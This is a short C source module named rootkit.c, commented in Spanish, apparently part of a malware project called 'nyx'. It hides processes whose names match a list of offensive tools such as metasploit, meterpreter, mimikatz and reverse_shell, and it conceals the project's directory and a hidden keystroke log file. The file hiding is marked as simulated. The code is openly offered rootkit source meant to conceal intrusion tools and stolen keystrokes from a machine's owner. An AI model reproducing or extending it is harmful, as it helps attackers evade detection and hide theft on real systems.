// ============================================================
// modules/rootkit.c - Ocultación básica (usa funciones del kernel)
// ============================================================
#include "modules.h"

static const char* hide_keywords[] = {
    "nyx", "metasploit", "nmap", "hydra", "john", "aircrack",
    "backdoor", "rootkit", "keylogger", "exploit", "payload",
    "reverse_shell", "bind_shell", "meterpreter", "cobalt",
    "beacon", "empire", "mimikatz", "responder", "sqlmap",
    "burpsuite", "wireshark", "tcpdump", "netcat",
    NULL
};

static bool should_hide(const char* str) {
    for (int i = 0; hide_keywords[i] != NULL; i++) {
        if (strcasestr(str, hide_keywords[i]) != NULL)
            return true;
    }
    return false;
}

void* module_rootkit_init(void) {
    // Ocultar procesos que coincidan con las palabras clave
    for (int i = 0; i < process_count; i++) {
        process_t* p = process_table[i];
        if (p && should_hide(p->comm)) {
            hide_process(p->pid);
        }
    }
    // Ocultar archivos que coincidan (simulado)
    hide_file("/opt/nyx");
    hide_file("/var/log/.nyx_keys");
    return NULL;
}